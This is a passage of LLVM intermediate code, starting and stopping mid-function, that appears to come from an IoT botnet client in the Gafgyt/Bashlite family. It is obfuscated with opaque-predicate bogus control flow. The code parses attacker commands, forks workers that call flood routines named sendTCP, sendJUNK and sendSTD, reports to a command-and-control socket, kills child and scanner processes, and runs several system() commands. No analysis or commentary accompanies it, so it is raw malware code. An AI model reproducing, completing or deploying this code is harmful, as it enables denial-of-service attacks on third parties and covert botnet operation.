  %1509 = load i8**, i8*** %4, align 8
  %1510 = getelementptr inbounds i8*, i8** %1509, i64 2
  %1511 = load i8*, i8** %1510, align 8
  %1512 = call i32 @atoi(i8* %1511) #10
  %1513 = icmp eq i32 %1512, -1
  br i1 %1513, label %1576, label %1514

; <label>:1514:                                   ; preds = %1508
  %1515 = load i8**, i8*** %4, align 8
  %1516 = getelementptr inbounds i8*, i8** %1515, i64 4
  %1517 = load i8*, i8** %1516, align 8
  %1518 = call i32 @atoi(i8* %1517) #10
  %1519 = icmp eq i32 %1518, -1
  br i1 %1519, label %1576, label %1520

; <label>:1520:                                   ; preds = %1514
  %1521 = load i8**, i8*** %4, align 8
  %1522 = getelementptr inbounds i8*, i8** %1521, i64 4
  %1523 = load i8*, i8** %1522, align 8
  %1524 = call i32 @atoi(i8* %1523) #10
  %1525 = icmp sgt i32 %1524, 32
  br i1 %1525, label %1576, label %1526

; <label>:1526:                                   ; preds = %1520
  %1527 = load i32, i32* %3, align 4
  %1528 = icmp sgt i32 %1527, 6
  br i1 %1528, label %1529, label %1551

; <label>:1529:                                   ; preds = %1526
  %1530 = load i32, i32* @x.79
  %1531 = load i32, i32* @y.80
  %1532 = sub i32 %1530, 1
  %1533 = mul i32 %1530, %1532
  %1534 = urem i32 %1533, 2
  %1535 = icmp eq i32 %1534, 0
  %1536 = icmp slt i32 %1531, 10
  %1537 = or i1 %1535, %1536
  br i1 %1537, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1529
  %1538 = load i8**, i8*** %4, align 8
  %1539 = getelementptr inbounds i8*, i8** %1538, i64 6
  %1540 = load i8*, i8** %1539, align 8
  %1541 = call i32 @atoi(i8* %1540) #10
  %1542 = icmp slt i32 %1541, 0
  %1543 = load i32, i32* @x.79
  %1544 = load i32, i32* @y.80
  %1545 = sub i32 %1543, 1
  %1546 = mul i32 %1543, %1545
  %1547 = urem i32 %1546, 2
  %1548 = icmp eq i32 %1547, 0
  %1549 = icmp slt i32 %1544, 10
  %1550 = or i1 %1548, %1549
  br i1 %1550, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1542, label %1576, label %1551

; <label>:1551:                                   ; preds = %originalBBpart2216, %1526
  %1552 = load i32, i32* %3, align 4
  %1553 = icmp eq i32 %1552, 8
  br i1 %1553, label %1554, label %1577

; <label>:1554:                                   ; preds = %1551
  %1555 = load i32, i32* @x.79
  %1556 = load i32, i32* @y.80
  %1557 = sub i32 %1555, 1
  %1558 = mul i32 %1555, %1557
  %1559 = urem i32 %1558, 2
  %1560 = icmp eq i32 %1559, 0
  %1561 = icmp slt i32 %1556, 10
  %1562 = or i1 %1560, %1561
  br i1 %1562, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1554
  %1563 = load i8**, i8*** %4, align 8
  %1564 = getelementptr inbounds i8*, i8** %1563, i64 7
  %1565 = load i8*, i8** %1564, align 8
  %1566 = call i32 @atoi(i8* %1565) #10
  %1567 = icmp slt i32 %1566, 1
  %1568 = load i32, i32* @x.79
  %1569 = load i32, i32* @y.80
  %1570 = sub i32 %1568, 1
  %1571 = mul i32 %1568, %1570
  %1572 = urem i32 %1571, 2
  %1573 = icmp eq i32 %1572, 0
  %1574 = icmp slt i32 %1569, 10
  %1575 = or i1 %1573, %1574
  br i1 %1575, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br i1 %1567, label %1576, label %1577

; <label>:1576:                                   ; preds = %originalBBpart2220, %originalBBpart2216, %1520, %1514, %1508, %originalBBpart2212, %originalBBpart2208
  br label %1855

; <label>:1577:                                   ; preds = %originalBBpart2220, %1551
  %1578 = load i8**, i8*** %4, align 8
  %1579 = getelementptr inbounds i8*, i8** %1578, i64 1
  %1580 = load i8*, i8** %1579, align 8
  store i8* %1580, i8** %39, align 8
  %1581 = load i8**, i8*** %4, align 8
  %1582 = getelementptr inbounds i8*, i8** %1581, i64 2
  %1583 = load i8*, i8** %1582, align 8
  %1584 = call i32 @atoi(i8* %1583) #10
  store i32 %1584, i32* %40, align 4
  %1585 = load i8**, i8*** %4, align 8
  %1586 = getelementptr inbounds i8*, i8** %1585, i64 3
  %1587 = load i8*, i8** %1586, align 8
  %1588 = call i32 @atoi(i8* %1587) #10
  store i32 %1588, i32* %41, align 4
  %1589 = load i8**, i8*** %4, align 8
  %1590 = getelementptr inbounds i8*, i8** %1589, i64 4
  %1591 = load i8*, i8** %1590, align 8
  %1592 = call i32 @atoi(i8* %1591) #10
  store i32 %1592, i32* %42, align 4
  %1593 = load i8**, i8*** %4, align 8
  %1594 = getelementptr inbounds i8*, i8** %1593, i64 5
  %1595 = load i8*, i8** %1594, align 8
  store i8* %1595, i8** %43, align 8
  %1596 = load i32, i32* %3, align 4
  %1597 = icmp eq i32 %1596, 8
  br i1 %1597, label %1598, label %1603

; <label>:1598:                                   ; preds = %1577
  %1599 = load i8**, i8*** %4, align 8
  %1600 = getelementptr inbounds i8*, i8** %1599, i64 7
  %1601 = load i8*, i8** %1600, align 8
  %1602 = call i32 @atoi(i8* %1601) #10
  br label %1604

; <label>:1603:                                   ; preds = %1577
  br label %1604

; <label>:1604:                                   ; preds = %1603, %1598
  %1605 = phi i32 [ %1602, %1598 ], [ 10, %1603 ]
  store i32 %1605, i32* %44, align 4
  %1606 = load i32, i32* %3, align 4
  %1607 = icmp sgt i32 %1606, 6
  br i1 %1607, label %1608, label %1613

; <label>:1608:                                   ; preds = %1604
  %1609 = load i8**, i8*** %4, align 8
  %1610 = getelementptr inbounds i8*, i8** %1609, i64 6
  %1611 = load i8*, i8** %1610, align 8
  %1612 = call i32 @atoi(i8* %1611) #10
  br label %1630

; <label>:1613:                                   ; preds = %1604
  %1614 = load i32, i32* @x.79
  %1615 = load i32, i32* @y.80
  %1616 = sub i32 %1614, 1
  %1617 = mul i32 %1614, %1616
  %1618 = urem i32 %1617, 2
  %1619 = icmp eq i32 %1618, 0
  %1620 = icmp slt i32 %1615, 10
  %1621 = or i1 %1619, %1620
  br i1 %1621, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1613
  %1622 = load i32, i32* @x.79
  %1623 = load i32, i32* @y.80
  %1624 = sub i32 %1622, 1
  %1625 = mul i32 %1622, %1624
  %1626 = urem i32 %1625, 2
  %1627 = icmp eq i32 %1626, 0
  %1628 = icmp slt i32 %1623, 10
  %1629 = or i1 %1627, %1628
  br i1 %1629, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br label %1630

; <label>:1630:                                   ; preds = %originalBBpart2224, %1608
  %1631 = phi i32 [ %1612, %1608 ], [ 0, %originalBBpart2224 ]
  store i32 %1631, i32* %45, align 4
  %1632 = load i8*, i8** %39, align 8
  %1633 = call i8* @strstr(i8* %1632, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %1634 = icmp ne i8* %1633, null
  br i1 %1634, label %1635, label %1687

; <label>:1635:                                   ; preds = %1630
  %1636 = load i8*, i8** %39, align 8
  %1637 = call i8* @strtok(i8* %1636, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1637, i8** %46, align 8
  br label %1638

; <label>:1638:                                   ; preds = %1668, %1635
  %1639 = load i8*, i8** %46, align 8
  %1640 = icmp ne i8* %1639, null
  br i1 %1640, label %1641, label %1670

; <label>:1641:                                   ; preds = %1638
  %1642 = call i32 @listFork()
  %1643 = icmp ne i32 %1642, 0
  br i1 %1643, label %1668, label %1644

; <label>:1644:                                   ; preds = %1641
  %1645 = load i32, i32* @x.79
  %1646 = load i32, i32* @y.80
  %1647 = sub i32 %1645, 1
  %1648 = mul i32 %1645, %1647
  %1649 = urem i32 %1648, 2
  %1650 = icmp eq i32 %1649, 0
  %1651 = icmp slt i32 %1646, 10
  %1652 = or i1 %1650, %1651
  br i1 %1652, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1644
  %1653 = load i8*, i8** %46, align 8
  %1654 = load i32, i32* %40, align 4
  %1655 = load i32, i32* %41, align 4
  %1656 = load i32, i32* %42, align 4
  %1657 = load i8*, i8** %43, align 8
  %1658 = load i32, i32* %45, align 4
  %1659 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %1653, i32 %1654, i32 %1655, i32 %1656, i8* %1657, i32 %1658, i32 %1659)
  call void @_exit(i32 0) #12
  %1660 = load i32, i32* @x.79
  %1661 = load i32, i32* @y.80
  %1662 = sub i32 %1660, 1
  %1663 = mul i32 %1660, %1662
  %1664 = urem i32 %1663, 2
  %1665 = icmp eq i32 %1664, 0
  %1666 = icmp slt i32 %1661, 10
  %1667 = or i1 %1665, %1666
  br i1 %1667, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  unreachable

; <label>:1668:                                   ; preds = %1641
  %1669 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1669, i8** %46, align 8
  br label %1638

; <label>:1670:                                   ; preds = %1638
  %1671 = load i32, i32* @x.79
  %1672 = load i32, i32* @y.80
  %1673 = sub i32 %1671, 1
  %1674 = mul i32 %1671, %1673
  %1675 = urem i32 %1674, 2
  %1676 = icmp eq i32 %1675, 0
  %1677 = icmp slt i32 %1672, 10
  %1678 = or i1 %1676, %1677
  br i1 %1678, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1670
  %1679 = load i32, i32* @x.79
  %1680 = load i32, i32* @y.80
  %1681 = sub i32 %1679, 1
  %1682 = mul i32 %1679, %1681
  %1683 = urem i32 %1682, 2
  %1684 = icmp eq i32 %1683, 0
  %1685 = icmp slt i32 %1680, 10
  %1686 = or i1 %1684, %1685
  br i1 %1686, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br label %1715

; <label>:1687:                                   ; preds = %1630
  %1688 = call i32 @listFork()
  %1689 = icmp ne i32 %1688, 0
  br i1 %1689, label %1690, label %1691

; <label>:1690:                                   ; preds = %1687
  br label %1855

; <label>:1691:                                   ; preds = %1687
  %1692 = load i32, i32* @x.79
  %1693 = load i32, i32* @y.80
  %1694 = sub i32 %1692, 1
  %1695 = mul i32 %1692, %1694
  %1696 = urem i32 %1695, 2
  %1697 = icmp eq i32 %1696, 0
  %1698 = icmp slt i32 %1693, 10
  %1699 = or i1 %1697, %1698
  br i1 %1699, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1691
  %1700 = load i8*, i8** %39, align 8
  %1701 = load i32, i32* %40, align 4
  %1702 = load i32, i32* %41, align 4
  %1703 = load i32, i32* %42, align 4
  %1704 = load i8*, i8** %43, align 8
  %1705 = load i32, i32* %45, align 4
  %1706 = load i32, i32* %44, align 4
  call void @sendTCP(i8* %1700, i32 %1701, i32 %1702, i32 %1703, i8* %1704, i32 %1705, i32 %1706)
  call void @_exit(i32 0) #12
  %1707 = load i32, i32* @x.79
  %1708 = load i32, i32* @y.80
  %1709 = sub i32 %1707, 1
  %1710 = mul i32 %1707, %1709
  %1711 = urem i32 %1710, 2
  %1712 = icmp eq i32 %1711, 0
  %1713 = icmp slt i32 %1708, 10
  %1714 = or i1 %1712, %1713
  br i1 %1714, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  unreachable

; <label>:1715:                                   ; preds = %originalBBpart2232
  %1716 = load i32, i32* @x.79
  %1717 = load i32, i32* @y.80
  %1718 = sub i32 %1716, 1
  %1719 = mul i32 %1716, %1718
  %1720 = urem i32 %1719, 2
  %1721 = icmp eq i32 %1720, 0
  %1722 = icmp slt i32 %1717, 10
  %1723 = or i1 %1721, %1722
  br i1 %1723, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1715
  %1724 = load i32, i32* @x.79
  %1725 = load i32, i32* @y.80
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br label %1732

; <label>:1732:                                   ; preds = %originalBBpart2240, %1461
  %1733 = load i8**, i8*** %4, align 8
  %1734 = getelementptr inbounds i8*, i8** %1733, i64 0
  %1735 = load i8*, i8** %1734, align 8
  %1736 = call i32 @strcmp(i8* %1735, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0)) #10
  %1737 = icmp ne i32 %1736, 0
  br i1 %1737, label %1801, label %1738

; <label>:1738:                                   ; preds = %1732
  store i32 0, i32* %47, align 4
  store i64 0, i64* %48, align 8
  br label %1739

; <label>:1739:                                   ; preds = %1797, %1738
  %1740 = load i32, i32* @x.79
  %1741 = load i32, i32* @y.80
  %1742 = sub i32 %1740, 1
  %1743 = mul i32 %1740, %1742
  %1744 = urem i32 %1743, 2
  %1745 = icmp eq i32 %1744, 0
  %1746 = icmp slt i32 %1741, 10
  %1747 = or i1 %1745, %1746
  br i1 %1747, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1739
  %1748 = load i64, i64* %48, align 8
  %1749 = load i64, i64* @numpids, align 8
  %1750 = icmp ult i64 %1748, %1749
  %1751 = load i32, i32* @x.79
  %1752 = load i32, i32* @y.80
  %1753 = sub i32 %1751, 1
  %1754 = mul i32 %1751, %1753
  %1755 = urem i32 %1754, 2
  %1756 = icmp eq i32 %1755, 0
  %1757 = icmp slt i32 %1752, 10
  %1758 = or i1 %1756, %1757
  br i1 %1758, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %1750, label %1759, label %1800

; <label>:1759:                                   ; preds = %originalBBpart2244
  %1760 = load i32*, i32** @pids, align 8
  %1761 = load i64, i64* %48, align 8
  %1762 = getelementptr inbounds i32, i32* %1760, i64 %1761
  %1763 = load i32, i32* %1762, align 4
  %1764 = icmp ne i32 %1763, 0
  br i1 %1764, label %1765, label %1780

; <label>:1765:                                   ; preds = %1759
  %1766 = load i32*, i32** @pids, align 8
  %1767 = load i64, i64* %48, align 8
  %1768 = getelementptr inbounds i32, i32* %1766, i64 %1767
  %1769 = load i32, i32* %1768, align 4
  %1770 = call i32 @getpid() #2
  %1771 = icmp ne i32 %1769, %1770
  br i1 %1771, label %1772, label %1780

; <label>:1772:                                   ; preds = %1765
  %1773 = load i32*, i32** @pids, align 8
  %1774 = load i64, i64* %48, align 8
  %1775 = getelementptr inbounds i32, i32* %1773, i64 %1774
  %1776 = load i32, i32* %1775, align 4
  %1777 = call i32 @kill(i32 %1776, i32 9) #2
  %1778 = load i32, i32* %47, align 4
  %1779 = add nsw i32 %1778, 1
  store i32 %1779, i32* %47, align 4
  br label %1780

; <label>:1780:                                   ; preds = %1772, %1765, %1759
  %1781 = load i32, i32* @x.79
  %1782 = load i32, i32* @y.80
  %1783 = sub i32 %1781, 1
  %1784 = mul i32 %1781, %1783
  %1785 = urem i32 %1784, 2
  %1786 = icmp eq i32 %1785, 0
  %1787 = icmp slt i32 %1782, 10
  %1788 = or i1 %1786, %1787
  br i1 %1788, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1780
  %1789 = load i32, i32* @x.79
  %1790 = load i32, i32* @y.80
  %1791 = sub i32 %1789, 1
  %1792 = mul i32 %1789, %1791
  %1793 = urem i32 %1792, 2
  %1794 = icmp eq i32 %1793, 0
  %1795 = icmp slt i32 %1790, 10
  %1796 = or i1 %1794, %1795
  br i1 %1796, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br label %1797

; <label>:1797:                                   ; preds = %originalBBpart2248
  %1798 = load i64, i64* %48, align 8
  %1799 = add i64 %1798, 1
  store i64 %1799, i64* %48, align 8
  br label %1739

; <label>:1800:                                   ; preds = %originalBBpart2244
  br label %1801

; <label>:1801:                                   ; preds = %1800, %1732
  %1802 = load i8**, i8*** %4, align 8
  %1803 = getelementptr inbounds i8*, i8** %1802, i64 0
  %1804 = load i8*, i8** %1803, align 8
  %1805 = call i32 @strcmp(i8* %1804, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0)) #10
  %1806 = icmp ne i32 %1805, 0
  br i1 %1806, label %1824, label %1807

; <label>:1807:                                   ; preds = %1801
  %1808 = load i32, i32* @x.79
  %1809 = load i32, i32* @y.80
  %1810 = sub i32 %1808, 1
  %1811 = mul i32 %1808, %1810
  %1812 = urem i32 %1811, 2
  %1813 = icmp eq i32 %1812, 0
  %1814 = icmp slt i32 %1809, 10
  %1815 = or i1 %1813, %1814
  br i1 %1815, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1807
  call void @exit(i32 0) #14
  %1816 = load i32, i32* @x.79
  %1817 = load i32, i32* @y.80
  %1818 = sub i32 %1816, 1
  %1819 = mul i32 %1816, %1818
  %1820 = urem i32 %1819, 2
  %1821 = icmp eq i32 %1820, 0
  %1822 = icmp slt i32 %1817, 10
  %1823 = or i1 %1821, %1822
  br i1 %1823, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  unreachable

; <label>:1824:                                   ; preds = %1801
  %1825 = load i8**, i8*** %4, align 8
  %1826 = getelementptr inbounds i8*, i8** %1825, i64 0
  %1827 = load i8*, i8** %1826, align 8
  %1828 = call i32 @strcmp(i8* %1827, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0)) #10
  %1829 = icmp ne i32 %1828, 0
  br i1 %1829, label %1855, label %1830

; <label>:1830:                                   ; preds = %1824
  %1831 = load i32, i32* @x.79
  %1832 = load i32, i32* @y.80
  %1833 = sub i32 %1831, 1
  %1834 = mul i32 %1831, %1833
  %1835 = urem i32 %1834, 2
  %1836 = icmp eq i32 %1835, 0
  %1837 = icmp slt i32 %1832, 10
  %1838 = or i1 %1836, %1837
  br i1 %1838, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1830
  %1839 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.87, i32 0, i32 0))
  %1840 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.88, i32 0, i32 0))
  %1841 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  %1842 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.90, i32 0, i32 0))
  %1843 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.91, i32 0, i32 0))
  %1844 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0))
  %1845 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.93, i32 0, i32 0))
  %1846 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.94, i32 0, i32 0))
  %1847 = load i32, i32* @x.79
  %1848 = load i32, i32* @y.80
  %1849 = sub i32 %1847, 1
  %1850 = mul i32 %1847, %1849
  %1851 = urem i32 %1850, 2
  %1852 = icmp eq i32 %1851, 0
  %1853 = icmp slt i32 %1848, 10
  %1854 = or i1 %1852, %1853
  br i1 %1854, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %1855

; <label>:1855:                                   ; preds = %originalBBpart2256, %1824, %1690, %1576, %1436, %originalBBpart2188, %1257, %originalBBpart2160, %1073, %originalBBpart2128, %originalBBpart2112, %originalBBpart2104, %756, %620, %originalBBpart252, %originalBBpart236, %304, %237, %210, %189, %184, %137, %originalBBpart24, %originalBBpart2, %54
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %63
  %1856 = load i32, i32* @mainCommSock, align 4
  %1857 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %1858 = call i8* @inet_ntoa(i32 %1857) #2
  %1859 = call i32 (i32, i8*, ...) @sockprintf(i32 %1856, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* %1858)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %93
  %1860 = load i32, i32* @mainCommSock, align 4
  %1861 = call i32 (i32, i8*, ...) @sockprintf(i32 %1860, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %118
  %1862 = load i32, i32* @scanPid, align 4
  %1863 = icmp eq i32 %1862, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %1864 = load i32, i32* @scanPid, align 4
  %1865 = call i32 @kill(i32 %1864, i32 9) #2
  %1866 = load i32, i32* @mainCommSock, align 4
  %1867 = call i32 (i32, i8*, ...) @sockprintf(i32 %1866, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %165
  %1868 = load i32, i32* @scanPid, align 4
  %1869 = icmp ne i32 %1868, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %191
  %1870 = load i32, i32* %6, align 4
  %1871 = icmp eq i32 %1870, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %238
  %1872 = load i8**, i8*** %4, align 8
  %1873 = getelementptr inbounds i8*, i8** %1872, i64 1
  %1874 = load i8*, i8** %1873, align 8
  store i8* %1874, i8** %7, align 8
  %1875 = load i8**, i8*** %4, align 8
  %1876 = getelementptr inbounds i8*, i8** %1875, i64 2
  %1877 = load i8*, i8** %1876, align 8
  %1878 = call i32 @atoi(i8* %1877) #10
  store i32 %1878, i32* %8, align 4
  %1879 = load i8**, i8*** %4, align 8
  %1880 = getelementptr inbounds i8*, i8** %1879, i64 3
  %1881 = load i8*, i8** %1880, align 8
  %1882 = call i32 @atoi(i8* %1881) #10
  store i32 %1882, i32* %9, align 4
  %1883 = load i8*, i8** %7, align 8
  %1884 = call i8* @strstr(i8* %1883, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %1885 = icmp ne i8* %1884, null
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %269
  %1886 = load i8*, i8** %7, align 8
  %1887 = call i8* @strtok(i8* %1886, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1887, i8** %10, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %309
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %347
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %364
  %1888 = load i8**, i8*** %4, align 8
  %1889 = getelementptr inbounds i8*, i8** %1888, i64 1
  %1890 = load i8*, i8** %1889, align 8
  store i8* %1890, i8** %11, align 8
  %1891 = load i8**, i8*** %4, align 8
  %1892 = getelementptr inbounds i8*, i8** %1891, i64 2
  %1893 = load i8*, i8** %1892, align 8
  %1894 = call i32 @atoi(i8* %1893) #10
  store i32 %1894, i32* %12, align 4
  %1895 = load i8**, i8*** %4, align 8
  %1896 = getelementptr inbounds i8*, i8** %1895, i64 3
  %1897 = load i8*, i8** %1896, align 8
  %1898 = call i32 @atoi(i8* %1897) #10
  store i32 %1898, i32* %13, align 4
  %1899 = load i8*, i8** %11, align 8
  %1900 = call i8* @strstr(i8* %1899, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %1901 = icmp ne i8* %1900, null
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %410
  %1902 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %1902, i8** %14, align 8
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %429
  %1903 = call i32 @listFork()
  %1904 = icmp ne i32 %1903, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %448
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %465
  %1905 = load i8*, i8** %11, align 8
  %1906 = load i32, i32* %12, align 4
  %1907 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %1905, i32 %1906, i32 %1907)
  call void @_exit(i32 0) #12
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %486
  %1908 = load i8**, i8*** %4, align 8
  %1909 = getelementptr inbounds i8*, i8** %1908, i64 0
  %1910 = load i8*, i8** %1909, align 8
  %1911 = call i32 @strcmp(i8* %1910, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i32 0, i32 0)) #10
  %1912 = icmp ne i32 %1911, 0
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %511
  %1913 = load i8**, i8*** %4, align 8
  %1914 = getelementptr inbounds i8*, i8** %1913, i64 3
  %1915 = load i8*, i8** %1914, align 8
  %1916 = call i32 @atoi(i8* %1915) #10
  %1917 = icmp eq i32 %1916, -1
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %539
  %1918 = load i8**, i8*** %4, align 8
  %1919 = getelementptr inbounds i8*, i8** %1918, i64 4
  %1920 = load i8*, i8** %1919, align 8
  %1921 = call i32 @atoi(i8* %1920) #10
  %1922 = icmp eq i32 %1921, -1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %567
  %1923 = load i8**, i8*** %4, align 8
  %1924 = getelementptr inbounds i8*, i8** %1923, i64 5
  %1925 = load i8*, i8** %1924, align 8
  %1926 = call i32 @atoi(i8* %1925) #10
  %1927 = icmp sgt i32 %1926, 65500
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %595
  %1928 = load i32, i32* %3, align 4
  %1929 = icmp eq i32 %1928, 7
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %621
  %1930 = load i8**, i8*** %4, align 8
  %1931 = getelementptr inbounds i8*, i8** %1930, i64 1
  %1932 = load i8*, i8** %1931, align 8
  store i8* %1932, i8** %15, align 8
  %1933 = load i8**, i8*** %4, align 8
  %1934 = getelementptr inbounds i8*, i8** %1933, i64 2
  %1935 = load i8*, i8** %1934, align 8
  %1936 = call i32 @atoi(i8* %1935) #10
  store i32 %1936, i32* %16, align 4
  %1937 = load i8**, i8*** %4, align 8
  %1938 = getelementptr inbounds i8*, i8** %1937, i64 3
  %1939 = load i8*, i8** %1938, align 8
  %1940 = call i32 @atoi(i8* %1939) #10
  store i32 %1940, i32* %17, align 4
  %1941 = load i8**, i8*** %4, align 8
  %1942 = getelementptr inbounds i8*, i8** %1941, i64 4
  %1943 = load i8*, i8** %1942, align 8
  %1944 = call i32 @atoi(i8* %1943) #10
  store i32 %1944, i32* %18, align 4
  %1945 = load i8**, i8*** %4, align 8
  %1946 = getelementptr inbounds i8*, i8** %1945, i64 5
  %1947 = load i8*, i8** %1946, align 8
  %1948 = call i32 @atoi(i8* %1947) #10
  store i32 %1948, i32* %19, align 4
  %1949 = load i32, i32* %3, align 4
  %1950 = icmp eq i32 %1949, 7
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %659
  %1951 = load i8**, i8*** %4, align 8
  %1952 = getelementptr inbounds i8*, i8** %1951, i64 6
  %1953 = load i8*, i8** %1952, align 8
  %1954 = call i32 @atoi(i8* %1953) #10
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %681
  store i32 %682, i32* %20, align 4
  %1955 = load i8*, i8** %15, align 8
  %1956 = call i8* @strstr(i8* %1955, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %1957 = icmp ne i8* %1956, null
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %708
  %1958 = call i32 @listFork()
  %1959 = icmp ne i32 %1958, 0
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %736
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %774
  %1960 = load i8**, i8*** %4, align 8
  %1961 = getelementptr inbounds i8*, i8** %1960, i64 2
  %1962 = load i8*, i8** %1961, align 8
  %1963 = call i32 @atoi(i8* %1962) #10
  %1964 = icmp slt i32 %1963, 1
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %802
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %843
  %1965 = load i8*, i8** %25, align 8
  %1966 = load i32, i32* %23, align 4
  %1967 = load i32, i32* %24, align 4
  call void @sendSTD(i8* %1965, i32 %1966, i32 %1967)
  call void @_exit(i32 0) #12
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %869
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %890
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %907
  %1968 = load i8**, i8*** %4, align 8
  %1969 = getelementptr inbounds i8*, i8** %1968, i64 0
  %1970 = load i8*, i8** %1969, align 8
